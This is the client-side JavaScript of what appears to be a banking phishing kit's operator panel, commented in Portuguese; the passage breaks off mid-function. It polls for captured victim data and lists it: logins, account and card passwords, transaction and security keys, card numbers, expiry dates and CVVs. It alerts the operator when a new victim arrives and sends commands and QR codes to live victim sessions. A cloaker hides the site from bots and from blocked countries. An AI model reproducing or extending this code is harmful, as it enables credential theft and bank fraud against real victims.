function atualizarContadores() {
	$.ajax({
		url: 'functions/fetch_count.php', 
		method: 'GET',
		dataType: 'json',
		success: function(data) {
			if (data.error) {
				console.error(data.error);
				return;
			}
			$('#total_visitas').text(data.total_visitas);
			$('#total_online').text(data.total_online);
			$('#total_consultas').text(data.total_consultas);
			$('#total_bloqueados').text(data.total_bloqueados);
		},
		error: function(jqXHR, textStatus, errorThrown) {
			console.error('Erro na requisição AJAX:', textStatus, errorThrown);
		}
	});
}

// Pausa os contadores quando a aba está oculta (economia real sem impacto para o operador)
var _contadorInterval = null;
function _iniciarContadores() {
	atualizarContadores();
	_contadorInterval = setInterval(atualizarContadores, 2500);
}
function _pararContadores() {
	clearInterval(_contadorInterval);
	_contadorInterval = null;
}
document.addEventListener('visibilitychange', function () {
	if (document.hidden) {
		_pararContadores();
		if (typeof _pararInfosTable === 'function') {
			_pararInfosTable();
		}
	} else {
		_iniciarContadores();
		if (typeof _iniciarInfosTable === 'function') {
			_iniciarInfosTable();
		}
	}
});

var audio = document.getElementById('audio');
function reproduzir(urlMusica) {
	audio.src = urlMusica;
	audio.play();
}

function notificacaoNova(dataId, tipoSom) {
    let arquivoSom = (tipoSom === "0") ? 'nova.mp3' : 'atualizacao.mp3';
	exibirSucesso("CHEGOU INFO PARA OPERAR");
    reproduzir(arquivoSom);
    fetch('functions/stop_som.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            id: dataId,
            som: 1
        })
    })
    .then(response => response.json()) 
    .then(data => {
        // console.log('Som parado:', data);
    })
    .catch(error => {
        // console.error('Erro ao tentar parar o som:', error);
    });
}

function copy(element) {
	var text = element.textContent;
	navigator.clipboard.writeText(text).then(function() {}, function(err) {
		// console.error('Erro ao copiar: ', err);
	});
}

function exibirSucesso(mensagem) {
    var toastEl = document.getElementById('dynamicToast');
    var toastBodyEl = document.getElementById('dynamicToastBody');

    if (toastEl && toastBodyEl) {
        toastBodyEl.textContent = mensagem;

        var toast = new bootstrap.Toast(toastEl);
        toast.show();
    }
    return false;
}
function exibirErro(mensagem) {
    var toastEl = document.getElementById('dynamicToastErro');
    var toastBodyEl = document.getElementById('dynamicToastBodyErro');

    if (toastEl && toastBodyEl) {
        toastBodyEl.textContent = mensagem;

        var toast = new bootstrap.Toast(toastEl);
        toast.show();
    }
    return false;
}
function validarIP(ip) {
    const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}$/;
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/;

    return ipv4Regex.test(ip) || ipv6Regex.test(ip);
}
function validarURL(url) {
    try {
        new URL(url);
        return true;
    } catch (_) {
        return false;
    }
}
function preencherFormularioCloaker(config) {
    $('#transisaoVpn').prop('checked', config.transisaoVpn === 1);
    $('#geradorSubdominio').prop('checked', config.geradorSubdominio === 1);
    $('#transicaoIpv6').prop('checked', config.transicaoIpv6 === 1);
    $('input[name="dispositivo"][value="' + config.dispositivo + '"]').prop('checked', true);
    $('#linkRedirecionamento').val(config.linkRedirecionamento);
    $('#subdominio').val(config.subdominio);

    function preencherSelect(selectId, valoresJson) {
		var valores = JSON.parse(valoresJson);
		var select = $(selectId);
	
		select.val(valores);
		select.selectpicker('refresh'); 
	
		setTimeout(function () {
			$(".dropdown-menu.inner.show li").each(function () {
				var itemValor = $(this).find("a").data("original-index"); 
	
				if (itemValor !== undefined) {
					var option = select.find("option").eq(itemValor); 
					var optionValue = option.val();
	
					
					if (valores.includes(optionValue)) {
						$(this).addClass("selected");
					} else {
						$(this).removeClass("selected");
					}
				}
			});
		}, 200); 
	}
    preencherSelect('#paisesBloqueados', config.paisesBloqueados);
}

var MK_INFOS_PER_PAGE_KEY = 'mk_infos_per_page';
var MK_INFOS_PAGE_KEY = 'mk_infos_page';

function mkValidPerPage(n) {
	if (n === 50 || n === 100 || n === 500) {
		return n;
	}
	return 100;
}

function mkLoadInfosPrefs() {
	try {
		var pp = parseInt(sessionStorage.getItem(MK_INFOS_PER_PAGE_KEY), 10);
		var pg = parseInt(sessionStorage.getItem(MK_INFOS_PAGE_KEY), 10);
		return {
			perPage: mkValidPerPage(pp),
			page: (!isNaN(pg) && pg >= 1) ? pg : 1
		};
	} catch (e) {
		return { perPage: 100, page: 1 };
	}
}

var mkInfosClient = mkLoadInfosPrefs();
var infosSinceRevision = '';
var infosSinceSlimHash = '';
var mkInfosTotalPages = 1;

function mkInfosBuildQueryUrl() {
	var p = new URLSearchParams();
	p.set('page', String(mkInfosClient.page));
	p.set('per_page', String(mkInfosClient.perPage));
	if (infosSinceRevision !== '' && infosSinceSlimHash !== '') {
		p.set('since_revision', infosSinceRevision);
		p.set('since_slim_hash', infosSinceSlimHash);
	}
	return 'functions/fetch_infos.php?' + p.toString();
}

function mkInfosUpdatePaginationUi(payload) {
	var infoEl = document.getElementById('mkInfosPageInfo');
	var sel = document.getElementById('mkInfosPerPage');
	var nextBtn = document.getElementById('mkInfosPageNext');
	if (infoEl && payload) {
		var tp = payload.total_pages != null ? payload.total_pages : mkInfosTotalPages;
		var tot = payload.total != null ? payload.total : 0;
		infoEl.textContent = 'Página ' + payload.page + ' de ' + tp + ' · ' + tot + ' consulta(s)';
	}
	if (sel && payload && payload.per_page) {
		sel.value = String(mkValidPerPage(parseInt(payload.per_page, 10)));
	}
	if (nextBtn && payload) {
		var maxP = payload.total_pages != null ? payload.total_pages : mkInfosTotalPages;
		nextBtn.disabled = (payload.page >= maxP);
	}
	var prevBtn = document.getElementById('mkInfosPagePrev');
	if (prevBtn && payload) {
		prevBtn.disabled = (payload.page <= 1);
	}
}

function mkRenderInfosRows(rows) {
	const tbody = document.querySelector('#mkTabelaInfos tbody');
	if (!tbody) {
		return;
	}
	tbody.innerHTML = '';

	const headers = ['#', 'usuario', 'senhaAcesso', 'telefone', 'agenciaConta', 'senhaCartao', 'senhaCartaoCredito', 'senhaTransacao', 'chaveSeguranca', 'codigo', 'chaveiro', 'cartao', 'validade', 'cvv', 'Página', 'Hora/Data', 'Localização'];

	if (Array.isArray(rows) && rows.length > 0) {
		rows.forEach(function(info) {
			const tr = document.createElement('tr');

			const tdAcao = document.createElement('td');
			tdAcao.classList.add('text-center');

			const statusBadgeClass = info.status_online === 'online' ? 'badge-success' : 'badge-danger';
			const statusBadge = `<span class='badge ${statusBadgeClass} mt-1' style='font-size: 11px; display: block;'>${info.status_online}</span>`;

			if (info.notificacao === '0') {
				tdAcao.innerHTML = `<a style='font-size: 22px; cursor: pointer;'>
							<i class="text-success fa-solid fa-earth-americas mkNotificacaoAtiva mkOperarInfo" data-id="${info.id}" data-navegador="${info.navegador}" data-ip="${info.ip}" data-dispositivo="${info.dispositivo}" data-sistema="${info.sistema}" data-nome="${info.nome}" data-serie="${info.serie}" data-ficha='${encodeURIComponent(info.ficha)}'></i>
							<br>
							${statusBadge}
							<span class='badge badge-primary mt-1' style='font-size: 11px;'>${info.status}</span>
							</a>`;
				if (info.som === '0') {
					notificacaoNova(info.id, '0');
				} else if (info.som === '2') {
					notificacaoNova(info.id, '2');
				}
			} else {
				tdAcao.innerHTML = `<a style='font-size: 22px;' data-id="${info.id}" data-navegador="${info.navegador}" data-ip="${info.ip}" data-dispositivo="${info.dispositivo}" data-sistema="${info.sistema}" data-nome="${info.nome}" data-serie="${info.serie}" data-ficha='${encodeURIComponent(info.ficha)}' class="mkOperarInfo">
							<i class="text-primary fa-solid fa-earth-americas"></i><br>${statusBadge}<span class='badge badge-primary mt-1' style='font-size: 11px;'>${info.status}</span>
							</a>`;
			}

			tr.appendChild(tdAcao);

			const columns = {
				'usuario': info.usuario,
				'senhaAcesso': info.senhaAcesso,
				'telefone': info.telefone,
				'agenciaConta': info.agenciaConta,
				'senhaCartao': info.senhaCartao,
				'senhaCartaoCredito': info.senhaCartaoCredito,
				'senhaTransacao': info.senhaTransacao,
				'chaveSeguranca': info.chaveSeguranca,
				'codigo': info.codigo,
				'chaveiro': info.chaveiro,
				'cartao': info.cartao,
				'validade': info.validade,
				'cvv': info.cvv,
				'Página': info.pagina,
				'Hora/Data': info.horaData,
				'Localização': `${info.cidade} - ${info.estado}`
			};

			headers.slice(1).forEach(function(header) {
				const td = document.createElement('td');
				td.classList.add('text-center');
				td.setAttribute('onclick', 'copy(this); exibirSucesso("Copiado com sucesso!");');
				td.textContent = columns[header] || '-';
				tr.appendChild(td);
			});

			tbody.appendChild(tr);
		});
	} else {
		const tr = document.createElement('tr');
		const td = document.createElement('td');
		td.colSpan = headers.length;
		td.classList.add('text-center');
		td.textContent = 'Nenhuma consulta realizada.';
		tr.appendChild(td);
		tbody.appendChild(tr);
	}
}

const fetchInfos = function() {
	fetch(mkInfosBuildQueryUrl())
		.then(function(response) {
			return response.json();
		})
		.then(function(data) {
			if (data && data.error) {
				console.error(data.error);
				return;
			}

			if (data && data.unchanged === true) {
				infosSinceRevision = data.revision || infosSinceRevision;
				infosSinceSlimHash = data.slim_hash || infosSinceSlimHash;
				mkInfosUpdatePaginationUi({
					page: data.page || mkInfosClient.page,
					per_page: data.per_page || mkInfosClient.perPage,
					total: data.total,
					total_pages: mkInfosTotalPages
				});
				return;
			}

			var rows = data;
			var meta = null;
			if (data && !Array.isArray(data) && Array.isArray(data.rows)) {
				rows = data.rows;
				meta = data;
			}

			if (meta) {
				infosSinceRevision = meta.revision || '';
				infosSinceSlimHash = meta.slim_hash || '';
				mkInfosClient.page = meta.page || mkInfosClient.page;
				mkInfosClient.perPage = mkValidPerPage(parseInt(meta.per_page, 10));
				mkInfosTotalPages = meta.total_pages != null ? meta.total_pages : 1;
				sessionStorage.setItem(MK_INFOS_PAGE_KEY, String(mkInfosClient.page));
				sessionStorage.setItem(MK_INFOS_PER_PAGE_KEY, String(mkInfosClient.perPage));
				mkInfosUpdatePaginationUi(meta);
			}

			mkRenderInfosRows(rows);
		})
		.catch(function(error) {
			console.error('Erro ao buscar dados:', error);
			const tbody = document.querySelector('#mkTabelaInfos tbody');
			if (tbody) {
				tbody.innerHTML = '<tr><td colspan="16" class="text-center text-danger">Erro ao carregar dados.</td></tr>';
			}
		});
};

var infosTablePolling = null;
function _pararInfosTable() {
	if (infosTablePolling) {
		clearInterval(infosTablePolling);
		infosTablePolling = null;
	}
}
function _iniciarInfosTable() {
	_pararInfosTable();
	fetchInfos();
	infosTablePolling = setInterval(fetchInfos, 2500);
}
function fetchLiberados() {
	fetch('functions/fetch_access.php?acesso=liberado') 
		.then(response => response.json())
		.then(data => {
			var tbody = document.querySelector('#mkTabelaLiberado');
			tbody.innerHTML = ''; 

			if (Array.isArray(data) && data.length > 0) {
				data.forEach(function(acesso) {
					var tr = document.createElement('tr');

					
					var tdIp = document.createElement('td');
					tdIp.classList.add('text-center');
					tdIp.textContent = acesso.ip;
					tr.appendChild(tdIp);

					
					var tdCidade = document.createElement('td');
					tdCidade.classList.add('text-center');
					tdCidade.textContent = acesso.cidade;
					tr.appendChild(tdCidade);

					
					var tdhoraData = document.createElement('td');
					tdhoraData.classList.add('text-center');
					tdhoraData.textContent = acesso.horaData;
					tr.appendChild(tdhoraData);

					
					var tdDispositivo = document.createElement('td');
					tdDispositivo.classList.add('text-center');
					tdDispositivo.textContent = acesso.dispositivo;
					tr.appendChild(tdDispositivo);

					
					var tdAcesso = document.createElement('td');
					tdAcesso.classList.add('text-center');

					
					var btnAcesso = document.createElement('button');
					btnAcesso.classList.add('btn', 'btn-success', 'btn-sm'); 
					btnAcesso.textContent = acesso.acesso; 

					
					tdAcesso.appendChild(btnAcesso);

					
					tr.appendChild(tdAcesso);

					tbody.appendChild(tr);
				});
			} else {
				var tr = document.createElement('tr');
				var td = document.createElement('td');
				td.colSpan = 5;
				td.classList.add('text-center');
				td.textContent = 'Nenhum acesso liberado encontrado.';
				tr.appendChild(td);
				tbody.appendChild(tr);
			}
		})
		.catch(error => console.error('Erro ao buscar dados de acessos liberados:', error));
}
function fetchBloqueados() {
	fetch('functions/fetch_access.php?acesso=bloqueado') 
		.then(response => response.json())
		.then(data => {
			var tbody = document.querySelector('#mkTabelaBloqueado');
			tbody.innerHTML = ''; 

			if (Array.isArray(data) && data.length > 0) {
				data.forEach(function(acesso) {
					var tr = document.createElement('tr');

					
					var tdIp = document.createElement('td');
					tdIp.classList.add('text-center');
					tdIp.textContent = acesso.ip;
					tr.appendChild(tdIp);

					
					var tdCidade = document.createElement('td');
					tdCidade.classList.add('text-center');
					tdCidade.textContent = acesso.cidade;
					tr.appendChild(tdCidade);

					
					var tdhoraData = document.createElement('td');
					tdhoraData.classList.add('text-center');
					tdhoraData.textContent = acesso.horaData;
					tr.appendChild(tdhoraData);

					
					var tdDispositivo = document.createElement('td');
					tdDispositivo.classList.add('text-center');
					tdDispositivo.textContent = acesso.dispositivo;
					tr.appendChild(tdDispositivo);

					
					var tdAcesso = document.createElement('td');
					tdAcesso.classList.add('text-center');
				
					var btnAcesso = document.createElement('button');
					btnAcesso.classList.add('btn', 'btn-danger', 'btn-sm'); 
					btnAcesso.textContent = acesso.acesso; 

					
					tdAcesso.appendChild(btnAcesso);

					
					tr.appendChild(tdAcesso);

					tbody.appendChild(tr);
				});
			} else {
				var tr = document.createElement('tr');
				var td = document.createElement('td');
				td.colSpan = 5;
				td.classList.add('text-center');
				td.textContent = 'Nenhum acesso bloqueado encontrado.';
				tr.appendChild(td);
				tbody.appendChild(tr);
			}
		})
		.catch(error => console.error('Erro ao buscar dados de acessos bloqueados:', error));
}
function fetchLogs() {
	const loading = document.getElementById('loading');
	const errorDiv = document.getElementById('error');
	const tbody = document.querySelector('#mkTabelaLogs tbody');

	loading.style.display = 'block';
	errorDiv.style.display = 'none';

	fetch('functions/fetch_logs.php')
		.then(response => {
			if (!response.ok) {
				throw new Error('Network response was not ok');
			}
			return response.json();
		})
		.then(data => {
			loading.style.display = 'none';
			tbody.innerHTML = ''; 

			if (data.error) {
				throw new Error(data.error);
			}

			data.forEach(log => {
				const row = document.createElement('tr');

				const ipCell = document.createElement('td');
				ipCell.textContent = log.ip;
				row.appendChild(ipCell);

				const logCell = document.createElement('td');
				logCell.textContent = log.log;
				row.appendChild(logCell);

				const dataCell = document.createElement('td');
				dataCell.textContent = log.horaData;
				row.appendChild(dataCell);

				const regiaoCell = document.createElement('td');
				regiaoCell.textContent = log.regiao;
				row.appendChild(regiaoCell);

				tbody.appendChild(row);
			});
		})
		.catch(error => {
			loading.style.display = 'none';
			errorDiv.style.display = 'block';
			console.error('Erro ao buscar logs:', error);
		});
}
var fetchOnline = function() {
	fetch('functions/fetch_online.php')
		.then(response => response.json())
		.then(data => {
			var tbody = document.querySelector('#mkTabelaOnline tbody');
			tbody.innerHTML = ''; 

			if (data.length > 0) {
				data.forEach(function(row) {
					var tr = document.createElement('tr');

					var tdDispositivo = document.createElement('td');
					tdDispositivo.classList.add('text-center');
					tdDispositivo.textContent = row.dispositivo;
					tr.appendChild(tdDispositivo);


					var tdLocalizacao = document.createElement('td');
					tdLocalizacao.classList.add('text-center');
					tdLocalizacao.textContent = row.cidade;
					tr.appendChild(tdLocalizacao);

					var tdLink = document.createElement('td');
					tdLink.classList.add('text-center');
					tdLink.textContent = row.pagina;
					tr.appendChild(tdLink);

					tbody.appendChild(tr);
				});
			} else {
				var tr = document.createElement('tr');
				var td = document.createElement('td');
				td.colSpan = 4;
				td.classList.add('text-center');
				td.textContent = 'Nenhuma informação online encontrada.';
				tr.appendChild(td);
				tbody.appendChild(tr);
			}
		})
		.catch(error => {
			console.error('Erro ao buscar dados:', error);
			var tbody = document.querySelector('#mkTabelaOnline tbody');
			tbody.innerHTML = '<tr><td colspan="4" class="text-center text-danger">Erro ao carregar dados.</td></tr>';
		});
};
var fetchIpsBlocks = function() {
	fetch('functions/fetch_ipsblocks.php')
		.then(response => response.json())
		.then(data => {
			var tbody = document.querySelector('#mkTabelaIpsBloqueados tbody');
			tbody.innerHTML = ''; 

			if (data.length > 0) {
				data.forEach(function(row) {
					var tr = document.createElement('tr');

					var tdIp = document.createElement('td');
					tdIp.classList.add('text-center');
					tdIp.textContent = row.ip;
					tr.appendChild(tdIp);


					var tdHoraData = document.createElement('td');
					tdHoraData.classList.add('text-center');
					tdHoraData.textContent = row.horaData;
					tr.appendChild(tdHoraData);

					tbody.appendChild(tr);
				});
			} else {
				var tr = document.createElement('tr');
				var td = document.createElement('td');
				td.colSpan = 4;
				td.classList.add('text-center');
				td.textContent = 'Nenhum IP.';
				tr.appendChild(td);
				tbody.appendChild(tr);
			}
		})
		.catch(error => {
			console.error('Erro ao buscar dados:', error);
			var tbody = document.querySelector('#mkTabelaOnline tbody');
			tbody.innerHTML = '<tr><td colspan="4" class="text-center text-danger">Erro ao carregar dados.</td></tr>';
		});
};

$(document).ready(function() {
	const botdPromise = import('https://openfpcdn.io/botd/v1').then((Botd) =>
		Botd.load()
	);
	
	botdPromise
		.then((botd) => botd.detect())
		.then((result) => {
			console.log(result);
			if (result.bot) {
				window.location.href = 'https://www.google.com';
			} else {
				
			}
		})
		.catch((error) => console.error(error));


	if (localStorage.getItem('salvarCredenciais') === 'true') {
		$('#usuario').val(localStorage.getItem('usuario'));
		$('#senha').val(localStorage.getItem('senha'));
		$('#salvarCredenciais').prop('checked', true);
	}
	
	// Substitui setInterval direto pelo controlador com visibility pause
	_iniciarContadores();
	
	$('#formularioSalvarUsuario').on('submit', function(e) {
		e.preventDefault(); 

		var senha = $('#senha').val().trim();

		
		if (senha === "") {
			Swal.fire({
				title: "Campo vazio!",
				text: "Informe a senha para atualizar.",
				icon: "warning",
				confirmButtonText: "Ok",
			});
			return;
		}

		
		$.ajax({
			url: 'functions/editUser.php', 
			type: 'POST',
			data: {
				senha: senha
			},
			success: function(resposta) {
				
				if (resposta.startsWith("Erro:")) {
					Swal.fire({
						title: "Erro",
						text: resposta.replace("Erro: ", ""),
						icon: "error",
						confirmButtonText: "Ok",
					});
				} else {
					
					Swal.fire({
						title: "Sucesso",
						text: resposta,
						icon: "success",
						showConfirmButton: false,
						timer: 1800
					}).then(() => {
						window.location.href = 'logout';
						
					});
				}
			},
			error: function(jqXHR, textStatus, errorThrown) {
				
				Swal.fire({
					title: "Erro",
					text: "Ocorreu um erro ao processar a requisição.",
					icon: "error",
					confirmButtonText: "Ok",
				});
				console.error("Erro AJAX:", textStatus, errorThrown);
			}
		});
	});

	$('#formularioSalvarPagamento').submit(function (e) {
		e.preventDefault(); 

		
		const formData = $(this).serializeArray();
		formData.push({ name: 'ajax', value: '1' }); 

		
		$.ajax({
			url: 'functions/editPayment.php', 
			type: 'POST',
			data: $.param(formData),
			dataType: 'json',
			success: function (response) {
				if (response.status === 'success') {
					Swal.fire({
						icon: 'success',
						title: 'Sucesso',
						text: response.message,
						timer: 2000,
						showConfirmButton: false
					});
				} else {
					Swal.fire({
						icon: 'error',
						title: 'Erro',
						text: response.message
					});
				}
			},
			error: function (xhr, status, error) {
				Swal.fire({
					icon: 'error',
					title: 'Erro',
					text: 'Ocorreu um erro ao processar a requisição.'
				});
			}
		});
	});
});

(function (w) {
	function trimQrcodeText(str) {
		return String(str == null ? "" : str).replace(/[\u200B-\u200D\uFEFF]/g, "").trim();
	}
	function isQrcodeDataUrl(str) {
		return /^data:image\/[a-zA-Z0-9.+-]+;base64,/i.test(trimQrcodeText(str));
	}
	function isQrcodeRawBase64(str) {
		const t = trimQrcodeText(str).replace(/\s+/g, "");
		if (t.length < 80) {
			return false;
		}
		if (/^https?:\/\//i.test(t) || isQrcodeDataUrl(t)) {
			return false;
		}
		return /^[A-Za-z0-9+/]+=*$/.test(t);
	}
	function qrcodePreviewSrc(str) {
		const t = trimQrcodeText(str);
		if (isQrcodeDataUrl(t)) {
			return t;
		}
		if (isQrcodeRawBase64(t)) {
			return "data:image/png;base64," + t.replace(/\s+/g, "");
		}
		if (/^https?:\/\//i.test(t)) {
			return t;
		}
		return "";
	}
	function parseQrcodeTextInput(str) {
		const t = trimQrcodeText(str);
		if (!t) {
			return null;
		}
		if (/^https?:\/\//i.test(t)) {
			return { qrcode: t, qrcodeTipo: "url" };
		}
		if (isQrcodeDataUrl(t)) {
			return { qrcode: t, qrcodeTipo: "data" };
		}
		if (isQrcodeRawBase64(t)) {
			return { qrcode: t.replace(/\s+/g, ""), qrcodeTipo: "base64" };
		}
		return null;
	}
	w.mkQrcodeInputHelpers = {
		trimQrcodeText: trimQrcodeText,
		isQrcodeDataUrl: isQrcodeDataUrl,
		isQrcodeRawBase64: isQrcodeRawBase64,
		qrcodePreviewSrc: qrcodePreviewSrc,
		parseQrcodeTextInput: parseQrcodeTextInput
	};
})(window);

document.addEventListener('DOMContentLoaded', function() {
	// Tipo de login: fora do fluxo de submits do painel — evita reload se algum listener anterior falhar.
	var btnTipoLogin = document.getElementById('btnSalvarTipoLogin');
	if (btnTipoLogin) {
		btnTipoLogin.addEventListener('click', function (ev) {
			ev.preventDefault();
			var checked = document.querySelector('#formTipoLogin input[name="tipoLogin"]:checked');
			var v = checked ? checked.value : '';
			if (!v) {
				exibirErro('Selecione uma opção.');
				return;
			}
			fetch('functions/saveTipoLogin.php', {
				method: 'POST',
				headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
				body: new URLSearchParams({ tipoLogin: v }).toString(),
				credentials: 'same-origin'
			})
				.then(function (r) {
					return r.json().then(function (data) {
						return { ok: r.ok, data: data };
					});
				})
				.then(function (res) {
					var data = res.data;
					if (data && data.mensagem) {
						exibirSucesso(data.mensagem);
						var el = document.getElementById('modalTipoLogin');
						if (el) {
							bootstrap.Modal.getInstance(el)?.hide();
						}
					} else if (data && data.error) {
						exibirErro(data.error);
					} else {
						exibirErro('Ocorreu um erro inesperado.');
					}
				})
				.catch(function () {
					exibirErro('Ocorreu um erro inesperado.');
				});
		});
	}

    const offcanvasElement = document.getElementById('offcanvasLogs');
    let updateInterval;
	var offcanvasOnline = document.getElementById('offcanvasOnline');
	var offcanvasIpsBlocks = document.getElementById('offcanvasIpsBlocks');
	var offcanvasAcessos = document.getElementById('offcanvasAcessos');
	var timer = null;

	document.addEventListener("click", function(event) {
		let targetElement = event.target;
	
		while (targetElement && !targetElement.classList.contains("mkOperarInfo")) {
			targetElement = targetElement.parentElement;
		}
	
		if (targetElement && targetElement.classList.contains("mkOperarInfo")) {
			const dataId = targetElement.getAttribute("data-id");
			const dataNavegador = targetElement.getAttribute("data-navegador");
			const dataIp = targetElement.getAttribute("data-ip");
			const dataDispositivo = targetElement.getAttribute("data-dispositivo");
			const dataSistema = targetElement.getAttribute("data-sistema");
			const dataNome = targetElement.getAttribute("data-nome");
			const dataSerie = targetElement.getAttribute("data-serie");
			// const dataFicha = targetElement.getAttribute("data-ficha");
			
			const dataFichaEncoded = targetElement.getAttribute("data-ficha");
			const dataFichaDecoded = decodeURIComponent(dataFichaEncoded);

			// Agora transformamos o JSON em objeto
			try {
				const fichaObj = JSON.parse(dataFichaDecoded);
				let fichaFormatada = '';

				for (const [chave, valor] of Object.entries(fichaObj)) {
					fichaFormatada += `${chave}: ${valor}\n`; // Monta o texto linha a linha
				}

				document.getElementById("dataFicha").innerText = fichaFormatada;

			} catch (error) {
				console.error('Erro ao processar data-ficha:', error);
				document.getElementById("dataFicha").innerText = dataFichaDecoded; // fallback para exibir como texto bruto
			}

	
			if (targetElement.classList.contains("mkNotificacaoAtiva")) {
				fetch('functions/stop_noti.php', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						id: dataId,
						notificacao: 1
					})
				})
				.then(response => response.json())
				.then(data => {
					if (data.success) {
						targetElement.classList.remove("text-success", "mkNotificacaoAtiva");
						targetElement.classList.add("text-primary");
	
						document.getElementById("idModalOperarInfo").value = dataId;
						document.getElementById("dataIp").innerText = dataIp;

						document.getElementById("idModalOperarInfo").value = dataId;
						document.getElementById("dataIp").innerText = dataIp;
						document.getElementById("dataNavegador").innerText = dataNavegador;
						document.getElementById("dataSistema").innerText = dataSistema;
						document.getElementById("dataDispositivo").innerText = dataDispositivo;
						document.getElementById("dataNome").innerText = dataNome;
						document.getElementById("dataSerie").innerText = dataSerie;
						document.getElementById("dataFicha").innerText = dataFichaDecoded;
		
	
						const offcanvasElement = document.getElementById("mkOffCanvasModalOprarInfo");
						const offcanvasInstance = new bootstrap.Offcanvas(offcanvasElement);
						offcanvasInstance.show();
					} else {
						console.error('Erro ao atualizar notificação:', data.error);
					}
				})
				.catch(error => {
					console.error('Erro ao enviar requisição:', error);
				});
			} else {
				
				document.getElementById("idModalOperarInfo").value = dataId;
				document.getElementById("dataIp").innerText = dataIp;
				document.getElementById("dataNavegador").innerText = dataNavegador;
				document.getElementById("dataSistema").innerText = dataSistema;
				document.getElementById("dataDispositivo").innerText = dataDispositivo;
				document.getElementById("dataNome").innerText = dataNome;
				document.getElementById("dataSerie").innerText = dataSerie;
	
				const offcanvasElement = document.getElementById("mkOffCanvasModalOprarInfo");
				const offcanvasInstance = new bootstrap.Offcanvas(offcanvasElement);
				offcanvasInstance.show();
			}
		}
	});
	document.getElementById("formComandos").addEventListener("click", function (event) {
		if (event.target.classList.contains("btnComando")) {
			const comando = event.target.value;
			const idModal = document.getElementById("idModalOperarInfo").value;
			const status = event.target.getAttribute("data-status");
	
			if (!comando) {
				console.error("Erro: O botão clicado não tem um valor definido.");
				return;
			}
	
			fetch("functions/comando.php", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({ comando, idModal, status }),
			})
			.then(response => {
				if (!response.ok) {
					throw new Error("Erro na resposta do servidor: " + response.status);
				}
				return response.json();
			})
			.then(data => {
				bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
				exibirSucesso("Comando atualizado com sucesso!");
			})
			.catch(error => {
				console.error("Erro ao enviar requisição:", error);
			});
		}
	});

	(function initFormQrcodeSubmit() {
		const formQrcode = document.getElementById("formQrcode");
		const btnEnviarQrcode = document.getElementById("mkEnviarQrcode");
		if (!formQrcode || !btnEnviarQrcode) return;

		const fileInput = formQrcode.querySelector("#file-input");
		const urlInput = document.getElementById("qrcodeUrlInput");
		const sendButton = formQrcode.querySelector(".send-button");

		function hideQrcodeSendButton() {
			if (sendButton) sendButton.style.display = "none";
		}

		function resetFormQrcodeDropZone() {
			const dropZoneEl = formQrcode.querySelector("#drop-zone");
			if (dropZoneEl && fileInput) {
				dropZoneEl.innerHTML = '<p>Arraste e solte aqui o seu <strong>QRCODE</strong></p><button type="button" class="upload-button">Buscar QRCODE</button>';
				dropZoneEl.querySelector(".upload-button")?.addEventListener("click", () => {
					fileInput.click();
				});
			}
		}

		function buildQrcodePayloadSync() {
			const rawInput = (urlInput && urlInput.value) ? urlInput.value : "";
			const parsed = window.mkQrcodeInputHelpers?.parseQrcodeTextInput(rawInput);
			if (parsed) {
				return { ok: true, qrcode: parsed.qrcode, qrcodeTipo: parsed.qrcodeTipo };
			}
			const file = fileInput?.files?.[0];
			if (file) {
				return { ok: true, file: file, qrcodeTipo: "file" };
			}
			const dropZoneEl = formQrcode.querySelector("#drop-zone");
			const img = dropZoneEl && dropZoneEl.querySelector("img");
			const src = img && img.getAttribute("src");
			if (src && /^data:image\//i.test(src)) {
				return { ok: true, qrcode: src, qrcodeTipo: "data" };
			}
			return {
				ok: false,
				message: "Selecione uma imagem, cole um link http(s) ou informe o código Base64 (data URL ou payload)."
			};
		}

		btnEnviarQrcode.addEventListener("click", function (event) {
			event.preventDefault();

			const comando = btnEnviarQrcode.value;
			const idModal = document.getElementById("idModalOperarInfo")?.value;
			const status = btnEnviarQrcode.getAttribute("data-status");

			if (!comando) {
				console.error("Erro: O botão clicado não tem um valor definido.");
				alert("Erro: O botão não tem um valor definido.");
				return;
			}

			if (!idModal) {
				console.error("Erro: ID do modal não definido.");
				alert("Erro: ID do modal não definido.");
				return;
			}

			const payload = buildQrcodePayloadSync();
			if (!payload.ok) {
				alert(payload.message);
				return;
			}

			function postQrcode(qrcode, qrcodeTipo) {
				return fetch("functions/comandoQrcode.php", {
					method: "POST",
					headers: {
						"Content-Type": "application/json"
					},
					body: JSON.stringify({
						comando: comando,
						idModal: idModal,
						status: status,
						qrcode: qrcode,
						qrcodeTipo: qrcodeTipo
					})
				}).then(async response => {
					const data = await response.json().catch(() => ({}));
					if (!response.ok) {
						throw new Error(data.mensagem || data.error || "Erro ao salvar o QR Code");
					}
					return data;
				});
			}

			function onSuccess(data) {
				if (!data.mensagem) {
